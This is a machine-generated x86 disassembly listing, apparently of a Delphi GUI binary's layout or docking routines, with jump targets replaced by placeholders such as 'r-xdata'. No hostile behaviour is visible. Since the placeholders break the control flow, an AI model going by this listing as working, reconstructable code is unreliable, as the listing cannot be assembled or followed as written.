sub_44641c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440548
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_44646c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d2b4
xor eax eax
push ebp
push sub_44650a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41d6a8
xor eax eax
push ebp
push sub_4464e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43cab8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4464ee
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41d6a8
retn
sub_44651c
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4465b0
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_446538
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4465b0
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_446ba8
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_4465b0
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_4465e4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_446674
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
mov edx 0x2
call sub_446674
jmp r-xdata
retn
sub_44662c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4466e0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
mov edx 0x2
call sub_4466e0
jmp r-xdata
retn
sub_446674
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_446aa8
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4466e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_446594
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_446aa8
push eax
mov eax esi
call sub_4465e4
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_446aa8
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_446790
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_446594
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_446ba8
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4466e0
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_446594
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4466e0
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_4465e4
mov edx eax
add edx esi
mov eax ebx
call sub_446ad0
mov edx edi
mov eax ebx
call sub_446ad0
jmp r-xdata
mov eax ebx
call sub_446930
mov eax ebx
call sub_446b80
mov ebx eax
test ebx ebx
jne r-xdata
sub_446838
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403fbc
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404010
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
sub_44687c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403468
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4468ed
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43ec10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_446900
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_446b80
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_446930
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4466e0
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4466e0
mov esi eax
push ebp
call sub_446900
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446b80
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_446674
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_446674
mov ecx ebx
pop edx
call sub_4125bc
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43d884
mov eax [ ebp - 0x4 ]
call sub_446aa8
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_446aa8
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_446aa8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_446aa8
push ebx
mov ebx eax
mov eax ebx
call sub_4465b0
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_446538
test al al
je r-xdata
mov eax ebx
call sub_4465e4
pop ebx
retn
sub_446ae4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446ad0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_446580
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_446ad4
mov edx esi
call sub_446ae4
sub_446b20
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_446aa8
mov edi eax
mov eax ebx
call sub_4465e4
cmp edi eax
jl r-xdata
mov eax esi
call sub_446790
mov eax [ esi + 0x1c ]
push eax
push sub_448630
mov edx esi
call sub_446e5c
mov eax ebx
call sub_446aa8
mov edi eax
mov eax esi
call sub_44662c
cmp edi eax
jle r-xdata
mov eax ebx
call sub_446b20
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_446b8c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4465b0
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_446bb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40323c
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403590
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44655c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ccb8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_423670
mov edx eax
mov eax ebx
call sub_41ce34
mov eax [ ebp - 0x4 ]
call sub_446d84
xor eax eax
push ebp
push sub_446cc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_441428
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_446790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446cc7
mov eax [ ebp - 0x4 ]
call sub_446d88
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4413ec
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_446cc7
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_448b58
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_446d1c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_447d88
mov eax [ esi + 0x10 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_446d9c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_446d9c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_446d9c
pop ecx
sub_446df4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_446d9c
pop ecx
sub_446e20
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_446e20
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_446e20
pop ecx
sub_446e74
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_446df4
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4466e0
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4466e0
push eax
mov edx 0x1
mov eax ebx
call sub_446674
push eax
mov edx 0x2
mov eax ebx
call sub_446674
pop edx
pop ecx
call sub_4125bc
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c88
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_446ef8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_446930
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_4125bc
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43d884
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44655c
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_446df4
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_446580
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_447e20
mov edx esi
mov eax ebx
call sub_446df4
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43de68
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44655c
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43de54
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4466e0
mov edx eax
mov eax edi
call sub_446ad0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4466e0
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4466e0
mov edx eax
mov eax edi
call sub_446ad0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4466e0
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_447108
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4472b0
jmp r-xdata
sub_447108
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44655c
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_446aa8
mov edx eax
mov eax ebx
call sub_446ad0
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_446ad0
mov eax [ esi + 0x64 ]
call sub_446aa8
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_448178
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446e5c
mov eax [ esi + 0x64 ]
call sub_446aa8
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_448178
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446e5c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_4484fc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446e5c
mov eax [ esi + 0x64 ]
call sub_446aa8
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_448630
xor edx edx
mov eax esi
call sub_446e5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_446ad0
adc edx 0x0
mov eax ebx
call sub_446790
mov eax ebx
call sub_446b20
push esi
push sub_448630
xor edx edx
mov eax esi
call sub_446e5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_4472b0
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_446790
mov eax [ ebx + 0x14 ]
call sub_446b20
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_447328
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_446aa8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_446aa8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_446aa8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_446674
mov esi eax
mov edx 0x2
mov eax ebx
call sub_446674
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_446aa8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
